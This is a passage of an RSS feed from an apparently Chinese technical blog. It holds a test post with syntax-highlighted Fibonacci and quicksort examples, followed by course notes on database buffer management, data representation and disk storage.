style=&#34;display:flex;&#34;&gt;&lt;span&gt;});&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;&#xA;&lt;p&gt;通过这些优化措施，网站的用户体验得到了显著提升。&lt;/p&gt;</description>
    </item>
    <item>
      <title>功能测试文章</title>
      <link>//localhost:64783/posts/test-feature/</link>
      <pubDate>Mon, 15 Jan 2024 10:00:00 +0800</pubDate>
      <guid>//localhost:64783/posts/test-feature/</guid>
      <description>&lt;h2 id=&#34;代码块测试&#34;&gt;代码块测试&lt;/h2&gt;&#xA;&lt;p&gt;这里是一个Python代码块，测试行号显示：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fibonacci&lt;/span&gt;(n):&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;计算斐波那契数列的第n项&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; n&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# 递归计算&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; fibonacci(n&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; fibonacci(n&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 测试函数&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;):&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;F(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;i&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;) = &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;fibonacci(i)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里是一个JavaScript代码块：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;quickSort&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pivot&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[Math.&lt;span style=&#34;color:#a6e22e&#34;&gt;floor&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)];&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;left&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [];&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;right&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [];&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;equal&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [];&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;element&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;element&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pivot&lt;/span&gt;) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;left&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;push&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;element&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;element&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pivot&lt;/span&gt;) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;right&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;push&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;element&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;equal&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;push&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;element&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; [...&lt;span style=&#34;color:#a6e22e&#34;&gt;quickSort&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;left&lt;/span&gt;), ...&lt;span style=&#34;color:#a6e22e&#34;&gt;equal&lt;/span&gt;, ...&lt;span style=&#34;color:#a6e22e&#34;&gt;quickSort&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;right&lt;/span&gt;)];&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 测试&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;numbers&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt;];&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;排序前:&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;numbers&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;排序后:&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;quickSort&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;numbers&lt;/span&gt;));&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;行内代码测试&#34;&gt;行内代码测试&lt;/h2&gt;&#xA;&lt;p&gt;这是一些行内代码：&lt;code&gt;console.log(&amp;quot;Hello World&amp;quot;)&lt;/code&gt;，还有 &lt;code&gt;npm install&lt;/code&gt; 命令。&lt;/p&gt;</description>
    </item>
    <item>
      <title>第5章 缓冲区管理</title>
      <link>//localhost:64783/posts/%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F/%E7%AC%AC5%E7%AB%A0-buffer-management/</link>
      <pubDate>Thu, 11 Jan 2024 05:27:05 +0800</pubDate>
      <guid>//localhost:64783/posts/%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F/%E7%AC%AC5%E7%AB%A0-buffer-management/</guid>
      <description>&lt;h2 id=&#34;缓冲区结构&#34;&gt;缓冲区结构&lt;/h2&gt;&#xA;&lt;h3 id=&#34;frame的参数&#34;&gt;frame的参数&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Dirty&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;!-- raw HTML omitted --&gt;Frame中的块是否已经被修改&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;Pin-count&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;!-- raw HTML omitted --&gt;Frame的块的已经被请求并且还未释放的计数，即当前的用户数&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;*Others&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;!-- raw HTML omitted --&gt;Latch: 是否加锁&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;当请求块时&#34;&gt;当请求块时&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;当一个程序请求一个不在内存中的数据块时，操作系统需要从磁盘中读取该数据块。&#xA;&lt;ul&gt;&#xA;&lt;li&gt;首先，它需要在内存中找到一个帧来存放这个数据块。&lt;/li&gt;&#xA;&lt;li&gt;如果选中的帧是&lt;strong&gt;脏的&lt;/strong&gt;（即，&lt;!-- raw HTML omitted --&gt;帧中的数据已被修改但尚未写回磁盘&lt;!-- raw HTML omitted --&gt;），那么操作系统需要先将这个帧的内容写回磁盘。&lt;/li&gt;&#xA;&lt;li&gt;然后，操作系统从磁盘中读取请求的数据块，并将其放入选中的帧中。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;最后，操作系统会增加该&lt;strong&gt;帧的固定计数&lt;/strong&gt;Pin-count（即，标记该帧正在被使用），并返回该数据块在内存中的地址。这样，程序就可以直接访问内存中的数据，而不需要再次从磁盘中读取。这个过程是操作系统管理内存的重要部分，也是实现虚拟内存的关键。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;当释放块时&#34;&gt;当释放块时&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;当程序完成对一个数据块的访问后，它需要取消&lt;!-- raw HTML omitted --&gt;固定（unpin）&lt;!-- raw HTML omitted --&gt;包含该数据块的帧，以便操作系统可以在需要时重新使用该帧。&lt;/li&gt;&#xA;&lt;li&gt;同时，如果程序修改了数据块的内容，它需要设置该帧的&lt;!-- raw HTML omitted --&gt;脏位（dirty bit）&lt;!-- raw HTML omitted --&gt;。脏位是用来标记帧中的数据是否已被修改，但尚未写回磁盘。如果脏位被设置，那么在帧被替换之前，操作系统需要先将帧的内容写回磁盘。这样可以确保磁盘中的数据始终是最新的，即使发生了系统崩溃或电源故障。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;缓冲区替换策略&#34;&gt;缓冲区替换策略&lt;/h2&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;当内存中没有空闲的帧来存放新的数据块时，操作系统需要选择一个已经被使用的帧进行替换。选择哪个帧进行替换是由替换策略决定的，常见的替换策略包括最近最少使用（LRU），时钟，先进先出（FIFO），最近最常使用（MRU）等。&lt;/li&gt;&#xA;&lt;li&gt;只有当帧的固定计数为0时，也就是说，当没有程序正在使用该帧时，该帧才会被考虑作为替换的候选者。&lt;/li&gt;&#xA;&lt;li&gt;替换策略的选择可以对系统的I/O性能产生重大影响，因为每次替换都可能需要从磁盘中读取数据或将数据写回磁盘。不同的访问模式可能会导致某些替换策略比其他策略表现得更好。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;理论最优算法opt算法&#34;&gt;理论最优算法：OPT算法&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;也称为Belady’s算法&lt;/p&gt;</description>
    </item>
    <item>
      <title>第4章 数据表达</title>
      <link>//localhost:64783/posts/%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F/%E7%AC%AC4%E7%AB%A0-data-representation/</link>
      <pubDate>Wed, 10 Jan 2024 04:27:05 +0800</pubDate>
      <guid>//localhost:64783/posts/%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F/%E7%AC%AC4%E7%AB%A0-data-representation/</guid>
      <description>&lt;h2 id=&#34;数据元素的表示层次&#34;&gt;数据元素的表示层次&lt;/h2&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Anonymity-0/Picgo/main/img/202401101821632.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;数据项&#34;&gt;数据项&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;!-- raw HTML omitted --&gt;字节序列&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;!-- raw HTML omitted --&gt;表示关系数据库中元组的属性值&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;数据项表示的内容&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;表示什么?&#xA;&lt;ul&gt;&#xA;&lt;li&gt;姓名&lt;/li&gt;&#xA;&lt;li&gt;年龄&lt;/li&gt;&#xA;&lt;li&gt;出生日期&lt;/li&gt;&#xA;&lt;li&gt;照片  &amp;hellip;..&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;用什么表示?&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Bytes&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;数据项表示方法:SQL数据类型&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Integer (short)&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;2 bytes&lt;/li&gt;&#xA;&lt;li&gt;例如，35 表示为 &lt;code&gt;00000000 00100011&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Real，Float&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;4 bytes (32 bits)&lt;/li&gt;&#xA;&lt;li&gt;N bits表示小数，M bits表示指数&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Char(n) 或 Character(n) 定长字符串&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;小于n时使用特殊填充符&lt;/li&gt;&#xA;&lt;li&gt;例如，若属性类型为Char(5)，则属性值’cat’ 表示为&lt;img src=&#34;https://raw.githubusercontent.com/Anonymity-0/Picgo/main/img/202401101826582.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Varchar(n) 变长字符串&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;NULL终止符，例 Varchar(5) &lt;img src=&#34;https://raw.githubusercontent.com/Anonymity-0/Picgo/main/img/202401101827553.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;&#xA;&lt;li&gt;带长度 &lt;img src=&#34;https://raw.githubusercontent.com/Anonymity-0/Picgo/main/img/202401101827373.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;&#xA;&lt;li&gt;定长表示，&lt;!-- raw HTML omitted --&gt;n+1 bytes &lt;!-- raw HTML omitted --&gt;Varchar(4): &lt;img src=&#34;https://raw.githubusercontent.com/Anonymity-0/Picgo/main/img/202401101827412.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Boolean&lt;/p&gt;</description>
    </item>
    <item>
      <title>第3章 数据存储</title>
      <link>//localhost:64783/posts/%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F/%E7%AC%AC3%E7%AB%A0-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/</link>
      <pubDate>Wed, 10 Jan 2024 03:27:05 +0800</pubDate>
      <guid>//localhost:64783/posts/%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F/%E7%AC%AC3%E7%AB%A0-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/</guid>
      <description>&lt;h2 id=&#34;典型磁盘结构&#34;&gt;典型磁盘结构&lt;/h2&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Anonymity-0/Picgo/main/img/202401082239172.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;盘片platter, 盘面 surface, 磁头 R/W head, 磁道 track, 柱面&#xA;cylinder, 扇区 sector&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;磁盘块存取时间&#34;&gt;磁盘块存取时间&lt;/h2&gt;&#xA;&lt;h3 id=&#34;相关计算概念&#34;&gt;相关计算概念&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;块（Block）&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;OS或DBMS进行磁盘数据存取的最小逻辑单元，由若干连续扇区构成&lt;/li&gt;&#xA;&lt;li&gt;块是DBMS中数据存取的最小单元&lt;/li&gt;&#xA;&lt;li&gt;扇区是磁盘中数据存储的最小单元&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;读块时间&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;从“发出块存取请求”到“块位于主存”的时间&lt;/li&gt;&#xA;&lt;li&gt;读块时间＝&lt;!-- raw HTML omitted --&gt;寻道时间S＋旋转延迟R＋传输时间T＋其它延迟&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;寻道时间（Seek Time）&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;磁头定位到所要的柱面所花费的时间&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;平均寻道时间&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Anonymity-0/Picgo/main/img/202401082239197.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;旋转延迟(Rotation Latency)&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;磁盘转动到块的第一个扇区到达磁头所需的时间&lt;/li&gt;&#xA;&lt;li&gt;平均时间为旋转1/2周所费的时间&lt;/li&gt;&#xA;&lt;li&gt;&lt;!-- raw HTML omitted --&gt;一个7200RPM的磁盘 平均旋转延迟 R≈4.17 ms&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;传输延迟(Transfer Time)&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;块的扇区及其间隙旋转通过磁头所需的时间&lt;/li&gt;&#xA;&lt;li&gt;如果磁道大约有100 000字节，约10ms转一周，则每秒可从磁盘读取约10M字节，一个4K字节的块传输时间小于0.5ms&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;其它延迟&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;CPU请求I/O的时间 (CPU time to issueI/O)&lt;/li&gt;&#xA;&lt;li&gt;争用磁盘控制器时间 (Contention for controller)&lt;/li&gt;&#xA;&lt;li&gt;争用总线和主存的时间 (Contention forbus, memory)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;如何读下一块？&lt;/strong&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>第2章 关系型数据库回顾</title>
      <link>//localhost:64783/posts/%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F/%E7%AC%AC2%E7%AB%A0-%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9B%9E%E9%A1%BE/</link>
      <pubDate>Wed, 10 Jan 2024 01:27:05 +0800</pubDate>
      <guid>//localhost:64783/posts/%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F/%E7%AC%AC2%E7%AB%A0-%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9B%9E%E9%A1%BE/</guid>
